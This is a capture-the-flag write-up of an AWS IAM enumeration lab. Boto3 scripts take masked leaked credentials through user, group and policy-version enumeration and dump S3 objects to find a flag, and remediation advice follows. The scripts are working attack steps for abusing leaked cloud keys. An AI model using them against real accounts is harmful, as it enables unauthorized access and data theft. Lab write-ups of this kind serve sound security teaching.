TL;DR

We were given leaked AWS credentials for user ian.miller. By chaining read-only IAM permissions, we discovered inherited group policies, an exposed S3 bucket name, and ultimately found the flag hidden inside an old policy version's Resource ARN — a classic case of sensitive data leakage in places nobody thinks to look.

Phase 1 — Identity Verification

The very first thing you always do with any leaked AWS credentials — verify they work and establish who you are. sts:GetCallerIdentity requires zero permissions and always succeeds with valid credentials.

python 
import boto3, json

session = boto3.Session(
    aws_access_key_id="AK**********",
    aws_secret_access_key="R**********",
    region_name="ap-south-1"
)

sts = session.client('sts')
identity = sts.get_caller_identity()
print(json.dumps(identity, indent=2, default=str))

Output:

{
  "UserId": "AI*********",
  "Account": "739147174912",
  "Arn": "arn:aws:iam::739147174912:user/ian.miller"
}

Key takeaway: The account ID 739147174912 is now known and will be used in every subsequent ARN construction. Always start here.

Phase 2 — Direct Policy Enumeration

Next we enumerated what permissions ian.miller had directly attached to his user account.

python 
iam = session.client('iam')

# List directly attached policies
policies = iam.list_attached_user_policies(UserName='ian.miller')
print(policies['AttachedPolicies'])

# Read the policy document
arn = 'arn:aws:iam::739147174912:policy/iam-read-identity'
policy = iam.get_policy(PolicyArn=arn)
vid = policy['Policy']['DefaultVersionId']
doc = iam.get_policy_version(PolicyArn=arn, VersionId=vid)
print(doc['PolicyVersion']['Document'])

The policy iam-read-identity granted the following actions:

"Action": [
  "iam:ListUsers", "iam:GetUser",
  "iam:ListRoles", "iam:GetRole",
  "iam:ListGroups", "iam:GetGroup"
]

Not very exciting on its own — but it gave us the ability to enumerate the entire IAM structure, which is exactly what we needed next.

Then we enumerated groups — and this is where it got interesting:

python 
# List all groups and their members/policies
groups = iam.list_groups()
for g in groups['Groups']:
    attached = iam.list_attached_group_policies(GroupName=g['GroupName'])
    members = iam.get_group(GroupName=g['GroupName'])
    print(g['GroupName'], '→', [p['PolicyName'] for p in attached['AttachedPolicies']])
    print('  members:', [u['UserName'] for u in members['Users']])
⚡ Critical Discovery

ian.miller was a member of the consultants group, which had iam-read-policy attached — a completely different, more powerful policy that was NOT visible from his direct user policies!

Phase 4 — Inherited Policy & S3 Bucket Discovery

Reading the iam-read-policy document revealed three sections. The third one was the goldmine:

python 
arn = 'arn:aws:iam::739147174912:policy/iam-read-policy'
policy = iam.get_policy(PolicyArn=arn)
vid = policy['Policy']['DefaultVersionId']
doc = iam.get_policy_version(PolicyArn=arn, VersionId=vid)
print(json.dumps(doc['PolicyVersion']['Document'], indent=2))
// Section 1: More IAM read permissions
"Action": ["iam:ListPolicies", "iam:GetPolicy", "iam:ListPolicyVersions", ...]

// Section 2: S3 bucket access — name leaked in policy!
"Action": ["s3:ListBucket", "s3:GetBucketLocation"],
"Resource": "arn:aws:s3:::iam-enum-bucket-secrets"

// Section 3: Full S3 object access
"Action": ["s3:GetObject", "s3:PutObject", "s3:DeleteObject", ...],
"Resource": "arn:aws:s3:::iam-enum-bucket-secrets/*"

Vulnerability: The bucket name iam-enum-bucket-secrets was leaked directly in the policy document. In real environments, policy documents often reveal internal bucket names, account IDs, and resource names that attackers can target.

Phase 5 — S3 Bucket Enumeration

With the bucket name and access permissions in hand, we listed the bucket contents:

python 
s3 = session.client('s3', region_name='ap-south-1')
bucket = 'iam-enum-bucket-secrets'

objects = s3.list_objects_v2(Bucket=bucket)
for obj in objects['Contents']:
    print(obj['Key'])
    content = s3.get_object(Bucket=bucket, Key=obj['Key'])
    print(content['Body'].read().decode())

This returned two files — exploit.txt containing "hello" and test.txt containing "pwned". Both were decoys. The real flag was elsewhere.

Phase 6 — Policy Version Enumeration (The Flag)

Since iam-read-policy also gave us iam:ListPolicies and iam:ListPolicyVersions, we enumerated all local policies and — crucially — all their versions:

python 
# List all local policies
all_policies = iam.list_policies(Scope='Local')

for policy in all_policies['Policies']:
    arn = policy['Arn']
    
    # Get ALL versions, not just the default
    versions = iam.list_policy_versions(PolicyArn=arn)
    
    for v in versions['Versions']:
        doc = iam.get_policy_version(PolicyArn=arn, VersionId=v['VersionId'])
        print(f"Policy: {policy['PolicyName']} | Version: {v['VersionId']}")
        print(json.dumps(doc['PolicyVersion']['Document'], indent=2))

The minimal-access-policy had TWO versions. Both contained the flag hidden inside the Resource ARN field — not in any actual data, but embedded in the policy structure itself:

// Version v1
{
  "Action": ["iam:list*"],
  "Effect": "Deny",
  "Resource": "arn:aws:iam::123456789012:user/FLAG{IAM_ENUMERATION_MASTERED}"
}

// Version v2
{
  "Action": ["iam:list*"],
  "Effect": "Deny",
  "Resource": "arn:aws:iam::123456789012:user/REDFOX{IAM_ENUMERATION_MASTERED}"
}

Vulnerabilities & Lessons

1. Leaked Credentials

The root cause of everything. AWS access keys for ian.miller were exposed, giving an attacker an initial foothold. This is the most common AWS attack vector — keys found in GitHub repos, CI/CD configs, environment variables, Docker images, and more.

Fix: Rotate credentials immediately when exposed. Use IAM roles instead of long-term access keys wherever possible. Enable AWS CloudTrail to detect key usage anomalies.

2. Indirect Permission Inheritance

ian.miller had minimal direct permissions but inherited powerful S3 and IAM read permissions through the consultants group. Most automated tools and security reviews only check direct user policies — group membership is often overlooked.

Fix: Always audit permissions at ALL levels — user, group, and role. Use AWS IAM Access Analyzer to identify overly permissive policies across the entire account.

3. Sensitive Resource Names in Policy Documents

The S3 bucket name iam-enum-bucket-secrets was directly visible in the policy's Resource field. This is information leakage — attackers learn what internal resources exist just by reading policies they have access to.

Fix: Be aware that policy documents containing resource ARNs are readable by anyone with iam:GetPolicyVersion. Consider using resource tags and condition keys instead of hardcoded ARNs where possible.

4. Stale Policy Versions

AWS retains old policy versions unless explicitly deleted (up to 5 versions per policy). Both v1 and v2 of minimal-access-policy contained sensitive data. Most security tools only inspect the default version.

Fix: Regularly delete old policy versions. Implement a policy lifecycle management process. When auditing, always enumerate ALL versions with iam:ListPolicyVersions.

5. Overly Broad S3 Permissions

The policy granted s3:PutObject and s3:DeleteObject in addition to read access — far more than necessary for a read-only scenario. This violates the principle of least privilege.

Fix: Apply least-privilege principles. Grant only the specific permissions required for each use case. Regularly review and trim permissions using AWS IAM Access Advisor.

6. Active Keys on Unused Accounts

Users pentest and snaptic-s3 had active access keys that appeared to be unused. In a real engagement these would be the next pivot point.

Fix: Implement a key rotation policy. Disable or delete access keys unused for more than 90 days. Use iam:GetAccessKeyLastUsed in automated auditing scripts.
